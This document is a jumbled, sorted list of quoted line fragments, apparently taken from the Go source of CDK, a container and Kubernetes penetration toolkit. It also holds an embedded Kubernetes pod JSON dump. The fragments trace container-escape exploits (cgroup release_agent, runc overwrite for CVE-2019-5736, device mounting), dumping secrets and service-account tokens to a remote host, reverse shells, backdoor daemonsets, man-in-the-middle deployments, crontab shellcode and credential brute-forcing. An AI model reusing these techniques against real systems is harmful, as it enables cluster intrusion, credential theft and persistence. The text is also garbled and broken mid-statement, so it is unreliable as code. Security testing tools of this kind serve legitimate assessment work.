"log.Printf(""%s: %s"", key, value)"
"log.Printf(""%v %v"
"log.Printf(""%v"", cli.Args[""<args>""].([]string))"
"log.Printf(""%v"", err)"
"log.Printf(""/proc mounted dir:"
"log.Printf(""/proc/1/cgroup error: %v"
"log.Printf(""/proc/self/cgroup error: %v"
"log.Printf(""/proc/sys/kernel/randomize_va_space file content: %s"", string(data))"
"log.Printf(""Account: %s:%s is available."
"log.Printf(""Blockdevice Marjor/Minor number invalid."")"
"log.Printf(""Execute Result: "
"log.Printf(""Execute Shell:%s failed with error:%s"", cmd, err1.Error())"
"log.Printf(""Trigger Release Error: %s "
"log.Printf(""Trying to create a pod to dump service-account:%s token to remote server %s:%s"
"log.Printf(""User-Defined Shell Payload: %s "
"log.Printf(""Write PID to cgroup.procs failed: %s "
"log.Printf(""X-Envoy-Peer-Metadata is %s."
"log.Printf(""X-Envoy-Peer-Metadata-Id is %s."
"log.Printf(""["
"log.Printf(""[-] Get log file error: %v"", err)"
"log.Printf(""[-] GetGateway error: %v"", err)"
"log.Printf(""[-] GetMountInfo error: %v"", err)"
"log.Printf(""[-] Not found /var/log mount"")"
"log.Printf(""[-] capability.CapHexParser: %v"
"log.Printf(""[-] kubelet log access error: %v"", err)"
"log.Printf(""[test] ping -> pong"
"log.Printf(""available commands:"
"log.Printf(""can not find host path"
"log.Printf(""cannot create subgroup :%s"", err)"
"log.Printf(""cannot decode JSON: %v"", err)"
"log.Printf(""cannot enable notify_on_release %s"", err)"
"log.Printf(""client.Do error: %v"
"log.Printf(""convert major number to int64 err: %v"
"log.Printf(""convert minor number to int64 err: %v"
"log.Printf(""current cgroup for exploit: %s "
"log.Printf(""current docker abs path:"
"log.Printf(""devices.allow content: %s"", devicesAllow)"
"log.Printf(""ending"
"log.Printf(""err found while open %s: %v"
"log.Printf(""error stdout: %s"", cmd.Stdout)"
"log.Printf(""exploit success, run "
"log.Printf(""failed to dial %s API."", apiInstance.CloudProvider)"
"log.Printf(""filter string for mount point is "
"log.Printf(""find cgroup devices.allow file: %s"
"log.Printf(""find release agent path %s"", releaseAgentPath)"
"log.Printf(""find release agent subsystem error"")"
"log.Printf(""found host blockDeviceId Major: %s Minor: %s"
"log.Printf(""found pod devices.allow path: %s"
"log.Printf(""found rw lxcfs mountpoint: %s"
"log.Printf(""generate cgroup dir: %s"
"log.Printf(""generate cronjob with "
"log.Printf(""generate shell exploit with user-input cmd: "
"log.Printf(""get /sys/fs/cgroup/devices/devices.allow inode error: %s"
"log.Printf(""get /sys/fs/cgroup/devices/devices.allow inode id: %d"
"log.Printf(""get mount info error: %v"", err)"
"log.Printf(""http.NewRequest error: %v"
"log.Printf(""if debugfs can not used, may be you can try to run "
"log.Printf(""log list: "
"log.Printf(""mknod err: %v"", err)"
"log.Printf(""net.ipv4.conf.all.route_localnet = %s"", string(data))"
"log.Printf(""no dir in the %s"", releaseAgentPath)"
"log.Printf(""open devices.list failed. %v"
"log.Printf(""password dict length: %d."
"log.Printf(""read devices.list failed. %v"
"log.Printf(""read execution result file error %s"", err)"
"log.Printf(""release_agent is not writable %s"", err)"
"log.Printf(""request apiserver uri "
"log.Printf(""rule { %s: %s } is not allowed."", match[1], match[2])"
"log.Printf(""run mount -t cgroup -o devices devices /tmp/cdk_dcgroup"
"log.Printf(""scanning %v with user-defined ports, max parallels:%v, timeout:%v"
"log.Printf(""scanning use time:%vms"
"log.Printf(""sensitive env found:"
"log.Printf(""service found in process:"
"log.Printf(""set %s"
"log.Printf(""set all block device accessible success."
"log.Printf(""set block accessible err %v"", err)"
"log.Printf(""shell payload:"
"log.Printf(""shell script saved to %s"", outFile)"
"log.Printf(""the target dir is %s"", targetDir)"
"log.Printf(""trying to create man in the middle ExternalIPs svc ip: %s and port: %s"", targetIP, targetPort)"
"log.Printf(""trying to create man in the middle deploy containers with image:%s and port:%s"", image, targetPort)"
"log.Printf(""trying to deploy daemonset with image:%s to k8s-app:%s"", image, k8sApp)"
"log.Printf(""trying to run shell cmd: %s"
"log.Printf(""trying to spawn shell to %s:%s"
"log.Printf(""user dict length: %d."
"log.Printf(""user-defined shell payload is: %s "
"log.Printf(""write shell exploit failed"
"log.Printf(""writeable cgroup devices.allow not found"")"
"log.Printf(""you can try another way to exploit, recommend: "
"log.Println(""/proc/1/cgroup file content:"")"
"log.Println(""/proc/self/cgroup file added content (compare pid 1) :"")"
"log.Println(""ASLR is disabled."")"
"log.Println(""ASLR is enabled."")"
"log.Println(""Capabilities hex of Caps(CapInh"
"log.Println(""Docker API response:"")"
"log.Println(""End!"")"
"log.Println(""Exploit CVE-2019-5736 with shellcode commands: "", cmd)"
"log.Println(""Finished."")"
"log.Println(""Found hostpath: "" "
"log.Println(""Invalid Input Args."")"
"log.Println(""Invalid input args"")"
"log.Println(""Invalid input args. (subsystem OR cmd not quoted)"")"
"log.Println(""Invalid input args."")"
"log.Println(""K8S Pod Security Policies rule list:"")"
"log.Println(""No Pods were obtained."")"
"log.Println(""Request Body: "", opts.PostData)"
"log.Println(""SYS_PTRACE capability was disabled."")"
"log.Println(""SYS_PTRACE capability was enabled."")"
"log.Println(""Shellcode will be trigger when an execve() call in container or the container is manually stopped."")"
"log.Println(""Successfully got write handle"", writeHandle)"
"log.Println(""THIS EXPLOIT WILL OVERWRITE RUNC BINARY AND BREAK CI/CD, BACKUP YOUR RUNC BINARY FIRST!"")"
"log.Println(""The command executed is"", payload)"
"log.Println(""Token authentication failed!"")"
"log.Println(""You may be able to access the localhost service of the current container node or other nodes."")"
"log.Println(""all exploits are finished, auto exploit failed."")"
"log.Println(""all exploits are finished, auto exploit success!"")"
"log.Println(""api-server response in deployPod:"")"
"log.Println(""api-server response in dumpPodConfig:"")"
"log.Println(""api-server response:"")"
"log.Println(""authorize success"")"
"log.Println(""cannot get docker daemon info from target unix socket."")"
"log.Println(""cannot run "
"log.Println(""check run ok, timeout in 2s, and return."")"
"log.Println(""checking docker socket: "", sock)"
"log.Println(""checking docker socket:"", sock)"
"log.Println(""checking if api-server allows system:anonymous request."")"
"log.Println(""container ID: "", params)"
"log.Println(""current dir:"", dir)"
"log.Println(""current user:"", u.Username, ""uid:"", u.Uid, ""gid:"", u.Gid, ""home:"", u.HomeDir)"
"log.Println(""dump Pod Security Policies success, saved in: "", outFile)"
"log.Println(""dump config json of pod:"", podName, ""in namespace:"", namespace)"
"log.Println(""dump configmap success, saved in: "", outFile)"
"log.Println(""dump secret success, saved in: "", outFile)"
"log.Println(""env GOTRACEBACK not found, trying to set GOTRACEBACK=crash then reload exploit."")"
"log.Println(""err found when parse input arg <parallel>"")"
"log.Println(""err found when parse input arg <timeout-ms>"")"
"log.Println(""err found while open"", p)"
"log.Println(""error found when gene ip list to scan task"")"
"log.Println(""exploit failed"")"
"log.Println(""exploit failed."")"
"log.Println(""exploit success"")"
"log.Println(""exploit success, shellcodes wrote to: "", crontabDir)"
"log.Println(""exploit success."")"
"log.Println(""failed to find docker abs path in /proc/self/mounts"")"
"log.Println(""failed to get api-server response"")"
"log.Println(""failed to write file."", err)"
"log.Println(""failed, 403 Forbidden, api-server response:"")"
"log.Println(""failed, api-server response:"")"
"log.Println(""find api-server pod:"")"
"log.Println(""finished."")"
"log.Println(""found"", len(devices), ""devices in total."")"
"log.Println(""getting K8s api-server API addr."")"
"log.Println(""happy escaping!"")"
"log.Println(""hostname:"", hostname)"
"log.Println(""invalid /proc dir path:"", args[0])"
"log.Println(""invalid input args."")"
"log.Println(""not privileged container."")"
"log.Println(""now, run 'debugfs -w cdk_mknod_result' to browse host files."")"
"log.Println(""overwrite file:"", path, ""success."")"
"log.Println(""ps.Processes() Failed, are you using windows"
"log.Println(""requesting "", configmapApi)"
"log.Println(""requesting "", cronJobAPI)"
"log.Println(""requesting "", defaultPodApi)"
"log.Println(""requesting "", pspApi)"
"log.Println(""requesting "", secretApi)"
"log.Println(""response:"")"
"log.Println(""searching secrets in "", path)"
"log.Println(""shadow api-server deploy success!"")"
"log.Println(""shim pid:"", info.Pid)"
"log.Println(""starting container:"", containerID)"
"log.Println(""starting to deploy exploit"")"
"log.Println(""success, docker.sock is available. please use "
"log.Println(""the shell is in a istio(service mesh) network."")"
"log.Println(""trigger segment fault to finish exploit, pls check if payload executed success after this program quit."")"
"log.Println(""try socket:"", sockname)"
"log.Println(""trying to dump K8s Pod Security Policies with local service-account:"", args[0])"
"log.Println(""trying to dump K8s Pod Security Policies with local service-account:"", conf.K8sSATokenDefaultPath)"
"log.Println(""trying to dump K8s Pod Security Policies with user system:anonymous"")"
"log.Println(""trying to dump K8s Secrets with local service-account:"", args[0])"
"log.Println(""trying to dump K8s Secrets with local service-account:"", conf.K8sSATokenDefaultPath)"
"log.Println(""trying to dump K8s Secrets with user system:anonymous"")"
"log.Println(""trying to dump K8s configmap with local service-account:"", args[0])"
"log.Println(""trying to dump K8s configmap with local service-account:"", conf.K8sSATokenDefaultPath)"
"log.Println(""trying to dump K8s configmap with user system:anonymous"")"
"log.Println(""trying to find api-server pod in namespace:kube-system"")"
"log.Println(""trying to list namespaces"")"
"log.Println(""trying to pull image:"", image)"
"log.Println(""trying to write crontab to: "", crontabDir)"
"log.Println(""usage: cdk probe <ip> <port> <parallels> <timeout-ms>"")"
"log.Println(""usage: cdk run mount-procfs <dir> "
"log.Println(""you can find Docker APIs in https://docs.docker.com/engine/api/v1.24/"")"
"log.Println(family, platform, osversion, ""kernel:"", kversion)"
"logf("""
"logf(""Accept failed: %s"", err)"
"logf(""Closed: %s"", conn.RemoteAddr())"
"logf(""Closed: %s"", dailAddr)"
"logf(""Connection received : %s"", addr.String())"
"logf(""Connection received: %s"", conn.RemoteAddr())"
"logf(""Dail failed: %s"", err)"
"logf(""Dialed host: %s://%s"", network, dailAddr)"
"logf(""Exited"")"
"logf(""Failed read: %s"", err)"
"logf(""Listen failed: %s"", err)"
"logf(""Listening on: %s://%s"", network, listenAddr)"
"logf(""Stdin stat failed: %s"", err)"
"logger := log.New(writer, """", log.LstdFlags"
"logger = log.New(os.Stderr, """", 0)"
"logger.Output(2, fmt.Sprintf(f, v...))"
"logger: logger,"
"login := fmt.Sprintf(""%s:%s"", username, password)"
"loglist := regexp.MustCompile(logLinkRegx).FindAllStringSubmatch(respText, -1)"
"loglistText := """""
"lst := strings.Split(matched, "":"")"
"lst, err := CapHexParser(capHex)"
"m, err := convert.conn.Write(resBytes)"
"mariadb-server,ver<5.5.52"
"mask, err := strconv.ParseUint(matched[1], 16, 64)"
"matched := pattern.FindAllStringSubmatch(resp, -1)"
"matched, _ := regexp.MatchString(""/kubelet/"
"matches := pat.FindAllStringSubmatch(resp, -1)"
"matches := re.FindAll(data, -1)"
"mi, """") {"
"mi, filterString) {"
"mi.Device = """""
"mi.Opts = strings.Split(fields[5], "","")"
"mi.SuperBlockOptions = strings.Split(fields[1], "","")"
"mi.SuperBlockOptions = strings.Split(fields[2], "","")"
"mountDir := fmt.Sprintf(""/tmp/cdk_%s"", util.RandString(5))"
"mountInfos := make([]MountInfo, len(ret))"
"mountInfos = append(mountInfos, mi)"
"mountInfos, err := util.GetMountInfo()"
"mountPoint := """""
"mountPointPath := ""/tmp/cgrp_"" "
"mountedDevs, err := util.GetMountInfo()"
"mountedDirs = append(mountedDirs, mountDir)"
"mountinfo, err := util.GetMountInfo()"
"mounts, _ := util.GetMountInfo()"
"n   Details: $details"""
"n %s"", hijackCommand)"
"n"") != ""1"" {"
"n""))"
"n"")))"
"n""), "":"")"
"n"", """
"n"", ""----"", ""------"")"
"n"", ""Link"", ""Status"")"
"n"", -1)  // escape shell cmd"
"n"", RouteLocalNetProcPath, err)"
"n"", Tasks[name].Desc())"
"n"", apiInstance.CloudProvider, apiInstance.API)"
"n"", apiInstance.DocURL)"
"n"", capStr, capability.CapListToString(caps))"
"n"", capability.CapListToString(addCaps))"
"n"", cli.Args[""<args>""])"
"n"", cmd)"
"n"", content)"
"n"", device, mountDir)"
"n"", deviceCGroupPath)"
"n"", devicesAllowPath)"
"n"", dockerPath)"
"n"", err)"
"n"", err.Error())"
"n"", err.Error()))"
"n"", fmt.Sprintf(""%s:%d"", stat.Laddr.IP, stat.Laddr.Port), stat.Status, fmt.Sprintf(""%s:%d"", stat.Raddr.IP, stat.Raddr.Port), stat.Pid)"
"n"", i.Name, a)"
"n"", image, inputArgs, schedule)"
"n"", inodeID)"
"n"", k, path, matched)"
"n"", k, v)"
"n"", len(passwordList))"
"n"", len(usernameList))"
"n"", line)"
"n"", matched)"
"n"", mi.Major, mi.Minor)"
"n"", mi.MountPoint)"
"n"", mi.Root)"
"n"", name)"
"n"", name, path)"
"n"", node)"
"n"", node, token)"
"n"", normalizeInput(""root""))"
"n"", out)"
"n"", p.Desc, ip, port)"
"n"", podName, namespace, node)"
"n"", proc.Pid(), proc.PPid(), proc.Executable())"
"n"", procDir)"
"n"", ps.ipRange, conf.TCPScannerConf.MaxParallel, ps.timeout)"
"n"", ps.ipRange, parallel, ps.timeout)"
"n"", result.Header.XEnvoyPeerMetadata)"
"n"", result.Header.XEnvoyPeerMetadataId)"
"n"", rhost, rport)"
"n"", scriptType, path, param)"
"n"", shellCmd)"
"n"", shellPayload)"
"n"", string(raw[6:len(raw)-5]))"
"n"", string(raw[8:len(raw)-5]))"
"n"", string(retRes))"
"n"", strings.Join(ans, "",""))"
"n"", strings.Join(cmd, "" ""))"
"n"", strings.Join(matched, """
"n"", subSysName)"
"n"", target, ref)"
"n"", targetServiceAccount, rhost, rport)"
"n"", useTime)"
"n"", user, p.Pid, ppid, pexe)"
"n"", username, password)"
"n"", util.RedBold.Sprint(""Caution: Flag auto-escape is deprecated as of CDK v1.5.1, and will be archived in v2.0. We recommend migrating to "
"n"", util.RedBold.Sprint(""cdk run lxcfs-rw""), util.RedBold.Sprint(""cdk run lxcfs-rw-cgroup""))"
"n"", v.OriginalInfo)"
"n""],""resources"":{},""volumeMounts"":[{""name"":""nginx-ingress-controller-token-whd5r"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""capabilities"":{""add"":[""SYS_ADMIN""],""drop"":[""ALL""]}}}],""containers"":[{""name"":""nginx-ingress-controller"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-ingress-controller:v0.30.0.1-5f89cb606-aliyun"",""args"":[""/nginx-ingress-controller"",""--configmap=$(POD_NAMESPACE)/nginx-configuration"",""--tcp-services-configmap=$(POD_NAMESPACE)/tcp-services"",""--udp-services-configmap=$(POD_NAMESPACE)/udp-services"",""--annotations-prefix=nginx.ingress.kubernetes.io"",""--publish-service=$(POD_NAMESPACE)/nginx-ingress-lb"",""--v=2""],""ports"":[{""name"":""http"",""containerPort"":80,""protocol"":""TCP""},{""name"":""https"",""containerPort"":443,""protocol"":""TCP""}],""env"":[{""name"":""POD_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.name""}}},{""name"":""POD_NAMESPACE"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.namespace""}}}],""resources"":{""requests"":{""cpu"":""100m"",""memory"":""70Mi""}},""volumeMounts"":[{""name"":""localtime"",""readOnly"":true,""mountPath"":""/etc/localtime""},{""name"":""nginx-ingress-controller-token-whd5r"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":10254,""scheme"":""HTTP""},""initialDelaySeconds"":10,""timeoutSeconds"":10,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""readinessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":10254,""scheme"":""HTTP""},""timeoutSeconds"":10,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""capabilities"":{""add"":[""NET_BIND_SERVICE""],""drop"":[""ALL""]},""runAsUser"":101}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""nginx-ingress-controller"",""serviceAccount"":""nginx-ingress-controller"",""nodeName"":""cn-beijing.192.168.0.155"",""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchExpressions"":[{""key"":""type"",""operator"":""NotIn"",""values"":[""virtual-kubelet""]}]}]}},""podAntiAffinity"":{""preferredDuringSchedulingIgnoredDuringExecution"":[{""weight"":100,""podAffinityTerm"":{""labelSelector"":{""matchExpressions"":[{""key"":""app"",""operator"":""In"",""values"":[""ingress-nginx""]}]},""topologyKey"":""kubernetes.io/hostname""}}]}},""schedulerName"":""default-scheduler"",""tolerations"":[{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:13:03Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:13:43Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:13:43Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:46Z""}],""hostIP"":""192.168.0.155"",""podIP"":""172.20.0.197"",""podIPs"":[{""ip"":""172.20.0.197""}],""startTime"":""2020-04-08T04:12:46Z"",""initContainerStatuses"":[{""name"":""init-sysctl"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-04-08T04:13:03Z"",""finishedAt"":""2020-04-08T04:13:03Z"",""containerID"":""docker://fa0bc6f12f5f04b95c3bca042e7c44b856988fb20dca26b48db60eab9b3d0841""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/busybox:v1.29.2"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/busybox@sha256:5e8e0509e829bb8f990249135a36e81a3ecbe94294e7a185cc14616e5fad96bd"",""containerID"":""docker://fa0bc6f12f5f04b95c3bca042e7c44b856988fb20dca26b48db60eab9b3d0841""}],""containerStatuses"":[{""name"":""nginx-ingress-controller"",""state"":{""running"":{""startedAt"":""2020-04-08T04:13:34Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-ingress-controller:v0.30.0.1-5f89cb606-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-ingress-controller@sha256:bef118e653cfd65dc097009981e49cd651539627b8f90b5c22fe4d90d5e2e679"",""containerID"":""docker://fdd7e693a5231fb6415b9713fc3699b39d8f1a8f72c1cf092bbd7461c4af3078"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""nginx-ingress-controller-5495b9fccf-dtr8n"",""generateName"":""nginx-ingress-controller-5495b9fccf-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/nginx-ingress-controller-5495b9fccf-dtr8n"",""uid"":""39813f36-d2af-44e6-950e-3a6accc5575b"",""resourceVersion"":""2116"",""creationTimestamp"":""2020-04-08T04:12:32Z"",""labels"":{""app"":""ingress-nginx"",""pod-template-hash"":""5495b9fccf""},""annotations"":{""kubernetes.io/psp"":""ack.privileged"",""prometheus.io/port"":""10254"",""prometheus.io/scrape"":""true""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""nginx-ingress-controller-5495b9fccf"",""uid"":""8d75401f-617c-40e9-a026-25418af036ff"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""localtime"",""hostPath"":{""path"":""/etc/localtime"",""type"":""File""}},{""name"":""nginx-ingress-controller-token-whd5r"",""secret"":{""secretName"":""nginx-ingress-controller-token-whd5r"",""defaultMode"":420}}],""initContainers"":[{""name"":""init-sysctl"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/busybox:v1.29.2"",""command"":[""/bin/sh"",""-c"",""mount -o remount rw /proc/sys"
"n""],""resources"":{},""volumeMounts"":[{""name"":""nginx-ingress-controller-token-whd5r"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""capabilities"":{""add"":[""SYS_ADMIN""],""drop"":[""ALL""]}}}],""containers"":[{""name"":""nginx-ingress-controller"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-ingress-controller:v0.30.0.1-5f89cb606-aliyun"",""args"":[""/nginx-ingress-controller"",""--configmap=$(POD_NAMESPACE)/nginx-configuration"",""--tcp-services-configmap=$(POD_NAMESPACE)/tcp-services"",""--udp-services-configmap=$(POD_NAMESPACE)/udp-services"",""--annotations-prefix=nginx.ingress.kubernetes.io"",""--publish-service=$(POD_NAMESPACE)/nginx-ingress-lb"",""--v=2""],""ports"":[{""name"":""http"",""containerPort"":80,""protocol"":""TCP""},{""name"":""https"",""containerPort"":443,""protocol"":""TCP""}],""env"":[{""name"":""POD_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.name""}}},{""name"":""POD_NAMESPACE"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.namespace""}}}],""resources"":{""requests"":{""cpu"":""100m"",""memory"":""70Mi""}},""volumeMounts"":[{""name"":""localtime"",""readOnly"":true,""mountPath"":""/etc/localtime""},{""name"":""nginx-ingress-controller-token-whd5r"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":10254,""scheme"":""HTTP""},""initialDelaySeconds"":10,""timeoutSeconds"":10,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""readinessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":10254,""scheme"":""HTTP""},""timeoutSeconds"":10,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""capabilities"":{""add"":[""NET_BIND_SERVICE""],""drop"":[""ALL""]},""runAsUser"":101}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""nginx-ingress-controller"",""serviceAccount"":""nginx-ingress-controller"",""nodeName"":""cn-beijing.192.168.0.155"",""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchExpressions"":[{""key"":""type"",""operator"":""NotIn"",""values"":[""virtual-kubelet""]}]}]}},""podAntiAffinity"":{""preferredDuringSchedulingIgnoredDuringExecution"":[{""weight"":100,""podAffinityTerm"":{""labelSelector"":{""matchExpressions"":[{""key"":""app"",""operator"":""In"",""values"":[""ingress-nginx""]}]},""topologyKey"":""kubernetes.io/hostname""}}]}},""schedulerName"":""default-scheduler"",""tolerations"":[{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:13:23Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:13:38Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:13:38Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:48Z""}],""hostIP"":""192.168.0.155"",""podIP"":""172.20.0.200"",""podIPs"":[{""ip"":""172.20.0.200""}],""startTime"":""2020-04-08T04:12:48Z"",""initContainerStatuses"":[{""name"":""init-sysctl"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-04-08T04:13:22Z"",""finishedAt"":""2020-04-08T04:13:22Z"",""containerID"":""docker://1d50836144b1807267d3b00107e6858dcf87dc1fd1065ef5d6c6d746aa5209a3""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/busybox:v1.29.2"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/busybox@sha256:5e8e0509e829bb8f990249135a36e81a3ecbe94294e7a185cc14616e5fad96bd"",""containerID"":""docker://1d50836144b1807267d3b00107e6858dcf87dc1fd1065ef5d6c6d746aa5209a3""}],""containerStatuses"":[{""name"":""nginx-ingress-controller"",""state"":{""running"":{""startedAt"":""2020-04-08T04:13:34Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-ingress-controller:v0.30.0.1-5f89cb606-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-ingress-controller@sha256:bef118e653cfd65dc097009981e49cd651539627b8f90b5c22fe4d90d5e2e679"",""containerID"":""docker://3093694fba5620cf7bf7213a95dbd10e00e660ca12098372733ef9aaa73a1417"",""started"":true}],""qosClass"":""Burstable""}}]}"
"n""},""name"":""cdxy-test-2021"",""namespace"":""default""},""spec"":{""containers"":[{""image"":""ubuntu:latest"",""name"":""container""}]}}'        "
"n""},""name"":""cdxy-test-2021"",""namespace"":""default""},""spec"":{""containers"":[{""image"":""ubuntu:latest"",""name"":""container""}]}}'"
"n%s"", command, string(output))"
"n%s"", e.CustomMsg, e.Err)"
"n%s"", fileContent)"
"n%s"", loglistText)"
"n', ''),"
"n', stderr)"
"n', stdout)"
"n, _ := cmdFile.Seek(0, io.SeekEnd)"
"n, addr, err := conn.ReadFrom(buf)"
"n/D3L1m/g')"""
"nCMD: "" "
"nClosed udp listen"")"
"nInvalid script name: %s , available scripts:"
"n[  "") "
"name := Args[""<exploit>""].(string)"
"name, err := base64.StdEncoding.DecodeString(k.Get(""key"").String())"
"name: ""./cdk eva"","
"name: ""./cdk ifconfig"","
"name: ""./cdk run test-poc"","
"name=$(echo ""$NAME"" "
"namespace := gjson.Get(resp, ""metadata.namespace"").String()"
"namespace := item.Get(""metadata.namespace"").String()"
"namespace, pod, container := params[1], params[2], params[3]"
"network-manager-vpnc,ver<1.2.6"
"nginx-full,ver<1.10.3"
"node := gjson.Get(resp, ""spec.nodeName"").String()"
"numb, err := strconv.ParseUint(capHex, 16, 64)"
"n{0.stdout}"""
"n{}'.format(env, cmd, type, pattern))"
"ok := Args[""eva""]"
"opt.Api = ""/v3/kv/range"""
"opt.Api, bytes.NewBuffer([]byte(opt.PostData)))"
"opt.Endpoint = fmt.Sprintf(""%s://%s"", u.Scheme, u.Host)"
"opt.Method = ""POST"""
"optStr := strings.Join(mi.Opts, "","")"
"opts.Method = ""GET"""
"opts.Method = ""POST"""
"opts.PostData = getBackDoorDaemonsetJson(k8sApp, image, inputArgs, apiVersion)"
"opts.PostData = strings.Replace(k8sGetSATokenPodConf, ""${RHOST}"", rhost, -1)"
"opts.PostData = strings.Replace(opts.PostData, ""${RPORT}"", rport, -1)"
"opts.PostData = strings.Replace(opts.PostData, ""${TARGET_SERVICE_ACCOUNT}"", targetServiceAccount, -1)"
"opts.Token = """""
"opts.TokenPath = """""
"optsDeploy.PostData = getK8sMitmPayloadDeployJson(image, targetPort)"
"optsSvc.PostData = getK8sMitmPayloadSvcJson(targetIP, targetPort)"
"os.Exit(0) // end main process, prevent to run exp twice"
"os.Mkdir(localBundlePath, os.ModePerm)"
"os.O_APPEND, 0666)"
"os.O_CREATE, perm)"
"os.O_SYNC, 0200)"
"os.O_TRUNC, 0700)"
"os.Symlink(targetFile, filepath)"
"out, _ := ioutil.ReadAll(r)"
"out, err := exec.Command(""ulimit"", ""-n"").Output()"
"out, err1 := cmd.Output()"
"outFile), 0644)"
"output, err := cmd.Output()"
"output, err := exec.Command(""bash"", ""-c"", script).Output()"
"output=1"","
"p := ""/proc/net/unix"""
"p = convert.Translate(p[:m], ""utf-8"")"
"parallel, err := strconv.ParseInt(args[2], 10, 64)"
"params := pattern.FindAllStringSubmatch(output.String(), -1)"
"params := pattern.FindAllStringSubmatch(string(data), -1)"
"params := pattern.FindAllStringSubmatch(string(data), 1)"
"params := strings.Split(u.Path, ""/"")"
"parts := strings.Split(r, "" - "")"
"path := cli.Args[""<args>""].([]string)[0]"
"path, err := kubectl.ExtractKubectl()"
"pattern := regexp.MustCompile(""("
"pattern := regexp.MustCompile(""[A-Fa-f0-9]{64}"")"
"pattern := regexp.MustCompile(""found "")"
"payload := fmt.Sprintf("""
